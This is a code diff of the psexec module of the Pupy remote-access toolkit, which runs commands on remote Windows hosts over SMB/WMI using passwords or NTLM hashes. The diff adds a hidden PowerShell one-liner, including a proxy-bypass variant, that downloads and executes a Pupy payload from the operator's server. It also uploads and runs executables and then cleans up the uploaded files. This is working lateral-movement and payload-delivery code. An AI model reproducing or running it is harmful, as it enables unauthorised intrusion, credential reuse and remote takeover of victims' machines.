@@ -1,6 +1,6 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Author: byt3bl33d3r and Shawn Evans
-# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r 
+# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
 import pupygen
@@ -21,16 +21,21 @@ __class_name__="PSExec"
 @config(cat="admin")
 class PSExec(PupyModule):
     """ Launch remote commands using smbexec or wmiexec"""
-    max_clients=1
+    max_clients = 1
+    dependencies = [ 'impacket', 'ntpath', 'calendar', 'pupyutils.psexec' ]
 
     def init_argparse(self):
-        
+
         self.arg_parser = PupyArgumentParser(prog="psexec", description=self.__doc__)
         self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
         self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
+        self.arg_parser.add_argument("-c", metavar="CODEPAGE", dest='codepage', default='cp437', help="Codepage")
         self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
         self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
         self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
+        self.arg_parser.add_argument("-S", dest='noout', action='store_true', help="Do not wait for command output")
+        self.arg_parser.add_argument("-T", metavar="TIMEOUT", dest='timeout', default=30, type=int,
+                                         help="Try to set this timeout")
         self.arg_parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
         self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
@@ -41,9 +46,10 @@ class PSExec(PupyModule):
         sgroupp = self.arg_parser.add_argument_group("Command Execution", "Get a remote shell")
         sgroupp.add_argument('--ps1-oneliner', action='store_true', default=False, help="Download and execute pupy using ps1_oneline")
         sgroupp.add_argument('--ps1-port', default=8080, type=int, help="Custom port used by the listening server (used with --ps1-oneliner, default: 8080)")
+        sgroupp.add_argument('--no-use-proxy', action='store_true', default=None, help="Don't use the target's proxy configuration even if it is used by target")
         sgroupp.add_argument("--ps1",  action='store_true', default=False, help="Upload and execute a powershell file to get a pupy session")
         sgroupp.add_argument("--file", dest="file", default=None, help="Upload and execute an exe file")
-        
+
     def run(self, args):
 
         if "/" in args.target[0]:
@@ -51,13 +57,14 @@ class PSExec(PupyModule):
         else:
             hosts = list()
             hosts.append(args.target[0])
-        
+
         ext = ''
         remote_path = ''
         dst_folder = ''
         file_to_upload = []
+        files_uploaded = []
         if args.file or args.ps1:
-            
+
             tmp_dir = tempfile.gettempdir()
 
             if self.client.is_windows():
@@ -65,7 +72,7 @@ class PSExec(PupyModule):
             else:
                 remote_path = '/tmp/'
 
-            # write on the temp directory 
+            # write on the temp directory
             if args.share == 'C$':
                 dst_folder = "C:\\Windows\\TEMP\\"
             # write on the root directory
@@ -98,7 +105,7 @@ class PSExec(PupyModule):
                 launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
                 open(tmp_dir + os.sep + first_stage, 'w').write(launcher)
                 self.success('first stage created: %s' % tmp_dir + os.sep + first_stage)
-                
+
                 command = getInvokeReflectivePEInjectionWithDLLEmbedded(self.client.get_conf())
                 open(tmp_dir + os.sep + second_stage, 'w').write(command)
                 self.success('second stage created: %s' % tmp_dir + os.sep + second_stage)
@@ -108,41 +115,54 @@ class PSExec(PupyModule):
                 dst = remote_path + file
 
                 self.info("Uploading file to {0}".format(dst))
-                upload(self.client.conn, src, dst)
+                upload(self.client.conn, src, dst, chunk_size=4*1024*1024)
+                files_uploaded.append(dst)
                 self.success("File uploaded")
 
         if args.ps1_oneliner:
-            res=self.client.conn.modules['pupy'].get_connect_back_host()
+            res = self.client.conn.modules['pupy'].get_connect_back_host()
             ip, port = res.rsplit(':', 1)
 
-            cmd = '%s/pupygen.py -f ps1_oneliner --ps1-oneliner-listen-port %s connect --host %s:%s' % (os.getcwd(), str(args.ps1_port), ip, port)
+            no_use_proxy = ''
+            if args.no_use_proxy:
+                no_use_proxy = '--no-use-proxy'
+                args.command = 'powershell.exe -w hidden -noni -nop -c "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString(\'http://%s:%s/eiloShaegae1\'));"' % (ip, str(args.ps1_port))
+            else:
+                args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
+
+            cmd = '%s/pupygen.py -f ps1_oneliner %s --ps1-oneliner-listen-port %s connect --host %s:%s' % (os.getcwd(), no_use_proxy, str(args.ps1_port), ip, port)
             self.warning('starting the local server')
             process = Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE, stdin=PIPE)
             time.sleep(2)
-            
+
             # check if the server has been launched corretly
             if process.poll():
                 self.error('the server has not been launched, check if the port %s or if the file %s/pupygen.py exists' % (str(args.ps1_port), os.getcwd()))
                 return
-            
+
             self.success('server started (pid: %s)' % process.pid)
-            args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
 
-        self.info("Loading dependencies")
-        self.client.load_package("impacket")
-        self.client.load_package('ntpath')
-        self.client.load_package("calendar")
-        self.client.load_package("pupyutils.psexec")
+        try:
+            with redirected_stdo(self):
+                for host in hosts:
+                    self.client.conn.modules["pupyutils.psexec"].connect(
+                        host, args.port, args.user, args.passwd, args.hash,
+                        args.share, file_to_upload, remote_path, dst_folder,
+                        args.command, args.domain, args.execm, args.codepage,
+                        args.timeout, args.noout
+                    )
 
-        with redirected_stdo(self.client.conn):
-            for host in hosts:
-                self.info("Connecting to the remote host: %s" % host)
-                self.client.conn.modules["pupyutils.psexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, file_to_upload, remote_path, dst_folder, args.command, args.domain, args.execm)
+                if args.ps1_oneliner:
+                    self.warning('stopping the local server (pid: %s)' % process.pid)
+                    process.terminate()
 
-            if args.ps1_oneliner:                
-                self.warning('stopping the local server (pid: %s)' % process.pid)
-                process.terminate()
+                elif args.ps1:
+                    self.warning('Do not forget to remove the file: %s' % dst_folder + first_stage)
+                    self.warning('Do not forget to remove the file: %s' % dst_folder + second_stage)
 
-            elif args.ps1:
-                self.warning('Do not forget to remove the file: %s' % dst_folder + first_stage)
-                self.warning('Do not forget to remove the file: %s' % dst_folder + second_stage)
+        finally:
+            for file in files_uploaded:
+                try:
+                    self.client.conn.modules.os.unlink(file)
+                except:
+                    pass
